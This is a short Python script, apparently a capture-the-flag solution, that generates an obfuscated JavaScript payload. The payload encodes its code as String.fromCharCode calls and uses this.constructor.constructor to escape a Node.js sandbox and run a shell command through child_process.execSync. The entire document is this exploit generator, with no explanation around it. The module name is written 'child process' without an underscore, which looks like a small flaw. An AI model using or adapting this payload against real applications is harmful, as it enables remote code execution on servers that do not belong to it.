def get(s):
    return "+".join(["a(" + str(ord(x)) + ")" for x in s])

print(
    "a=String.fromCharCode;"
    + "this.constructor.constructor("
    + get(
        "return process.mainModule.constructor._load('child process').execSync('ls').toString()"
    )
    + ")()"
)